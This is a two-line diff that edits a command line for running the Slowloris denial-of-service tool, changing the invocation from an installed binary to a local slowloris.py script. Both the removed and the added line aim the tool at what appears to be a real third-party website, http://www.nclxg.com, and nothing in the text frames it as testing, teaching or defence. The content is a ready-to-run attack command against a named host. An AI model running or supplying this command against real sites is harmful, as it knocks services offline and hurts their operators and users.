@@ -1,2 +1,2 @@
- python2 ~/.local/bin/slowloris -u  http://www.nclxg.com
+ python2 slowloris.py -u  http://www.nclxg.com
 
